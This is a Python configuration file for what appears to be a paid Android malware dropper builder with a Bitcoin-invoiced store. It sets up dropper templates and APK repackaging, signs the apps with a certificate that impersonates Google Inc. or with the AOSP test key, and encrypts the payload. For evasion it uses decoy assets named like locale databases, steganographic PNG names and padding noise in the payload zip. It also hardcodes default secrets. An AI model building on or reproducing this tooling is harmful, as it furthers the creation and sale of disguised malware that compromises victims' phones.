import os
from datetime import timedelta

from dotenv import load_dotenv

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
load_dotenv(os.path.join(BASE_DIR, ".env"))

class Config:
    SECRET_KEY = os.environ.get("SECRET_KEY", "katana_secret_2026")
    MAX_CONTENT_LENGTH = 27 * 1024 * 1024
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    PERMANENT_SESSION_LIFETIME = timedelta(days=30)

    TEMPLATES_AUTO_RELOAD = False

    UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
    OUTPUT_FOLDER = os.path.join(BASE_DIR, "outputs")
    STORE_CATALOG_DIR = os.path.join(BASE_DIR, "store_catalog")
    STORE_BTC_ADDRESS = os.environ.get(
        "STORE_BTC_ADDRESS",
        "bc1q9afer30l2a2ruqe2qf2kqhudymx7fl90897a74",
    )
    STORE_PREVIEW_PROTECT = os.environ.get(
        "STORE_PREVIEW_PROTECT", "1"
    ).strip().lower() not in {"0", "false", "no", "off"}

    BITCOIN_DESCRIPTOR = os.environ.get("BITCOIN_DESCRIPTOR", "").strip()
    BITCOIN_NETWORK = os.environ.get("BITCOIN_NETWORK", "signet").strip().lower()
    BITCOIN_START_INDEX = int(os.environ.get("BITCOIN_START_INDEX", "0"))
    BITCOIN_INVOICE_MINUTES = int(os.environ.get("BITCOIN_INVOICE_MINUTES", "15"))
    BITCOIN_REQUIRED_CONFIRMATIONS = int(
        os.environ.get("BITCOIN_REQUIRED_CONFIRMATIONS", "1")
    )
    BITCOIN_MEMPOOL_API = os.environ.get(
        "BITCOIN_MEMPOOL_API", "https://mempool.space/api"
    ).rstrip("/")
    BITCOIN_BLOCKSTREAM_API = os.environ.get(
        "BITCOIN_BLOCKSTREAM_API", "https://blockstream.info/api"
    ).rstrip("/")
    BITCOIN_RATE_API = os.environ.get(
        "BITCOIN_RATE_API", "https://api.coingecko.com/api/v3"
    ).rstrip("/")
    BITCOIN_MONITOR_INTERVAL = int(os.environ.get("BITCOIN_MONITOR_INTERVAL", "20"))
    BITCOIN_MONITOR_ENABLED = os.environ.get(
        "BITCOIN_MONITOR_ENABLED", "1"
    ).strip().lower() not in {"0", "false", "no", "off"}
    PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
    PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")

    DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
    DROPPER_TEMPLATE_BACKUP_ZIP = os.path.join(BASE_DIR, "dropper_rebuild_backup.zip")
    DROPPER_LAB_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild_lab")
    DROPPER_LAB_TEMPLATE_BACKUP_ZIP = os.path.join(
        BASE_DIR, "dropper_rebuild_lab_backup.zip"
    )
    DROPPER_DEBUG_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild_debug")
    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
    APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
    DROPPER_LIBS_DEX = os.path.join(
        BASE_DIR, "dropper_rebuild", "prebuilt", "androidx_material.dex"
    )
    INJECT_SECONDARY_DEX = False

    _BUILD_TOOLS = os.environ.get(
        "ANDROID_BUILD_TOOLS",
        os.path.join(
            BASE_DIR, "app-tools", "android-sdk", "build-tools", "35.0.0"
        ),
    )

    @staticmethod
    def _tool_path(directory, name):
        candidates = [os.path.join(directory, name)]
        if os.name == "nt":
            candidates = [
                os.path.join(directory, name + ".exe"),
                os.path.join(directory, name + ".bat"),
                os.path.join(directory, name + ".cmd"),
                os.path.join(directory, name),
            ]
        for candidate in candidates:
            if os.path.isfile(candidate):
                return candidate
        return candidates[0]

    KEYSTORE_VALIDITY_DAYS = 10000
    KEYSTORE_KEY_ALG = "RSA"
    KEYSTORE_KEY_SIZE = 2048
    KEYSTORE_SIG_ALG = "SHA256withRSA"
    KEYSTORE_STORE_TYPE = "PKCS12"
    SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
    AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
    AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
    RELEASE_KEYSTORE = os.path.join(BASE_DIR, "signing", "release.p12")
    RELEASE_KEY_ALIAS = os.environ.get("RELEASE_KEY_ALIAS", "androidapp")
    RELEASE_KEYSTORE_PASS = os.environ.get(
        "RELEASE_KEYSTORE_PASS", "android_app_release_2026"
    )
    RELEASE_DNAME = os.environ.get(
        "RELEASE_DNAME",
        "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US",
    )
    APKSIGNER_V3_ENABLED = False

    OLD_PACKAGE = "com.turbo.live"
    PACKAGE_PREFIX = "com"

    CIPHER_TRANSFORM = "AES/GCM/NoPadding"
    CRYPTO_XOR_FIXED = False
    CRYPTO_XOR_BYTE = 0xE7

    ASSET_NAME_POOL = (
        "locale_ko.db",
        "locale_ja.db",
        "locale_de.db",
        "locale_fr.db",
        "locale_es.db",
        "locale_pt.db",
        "locale_it.db",
        "locale_zh.db",
        "locale_ru.db",
        "locale_ar.db",
        "cache_kf.bin",
        "config_hd.db",
    )

    STEGO_ASSET_NAME_POOL = (
        "banner_art.png",
        "splash_bg.png",
        "ic_hero.png",
        "promo_tile.png",
    )

    CRYPTO_CLASS_TEMPLATE = "vd"
    DECOY_ASSET_MIN = 3
    DECOY_ASSET_MAX = 7
    DECOY_ASSET_SIZE_MIN = 512
    DECOY_ASSET_SIZE_MAX = 4096

    ZIP_NORMALIZE_TIMESTAMPS = True
    ZIP_EPOCH_DATE_TIME = (1981, 1, 1, 1, 1, 2)

    PAYLOAD_ZIP_NOISE = True
    PAYLOAD_ZIP_NOISE_MIN = 400
    PAYLOAD_ZIP_NOISE_MAX = 700

    VERSION_NAME_MAJOR = (7, 9)
    VERSION_CODE_BASE = 30

Config.APKSIGNER = Config._tool_path(Config._BUILD_TOOLS, "apksigner")
Config.ZIPALIGN = Config._tool_path(Config._BUILD_TOOLS, "zipalign")

def ensure_directories(config):
    for directory in (
        config.UPLOAD_FOLDER,
        config.OUTPUT_FOLDER,
        config.STORE_CATALOG_DIR,
        config.PUBLIC_ICONS_FOLDER,
        os.path.join(BASE_DIR, "logs"),
    ):
        os.makedirs(directory, exist_ok=True)

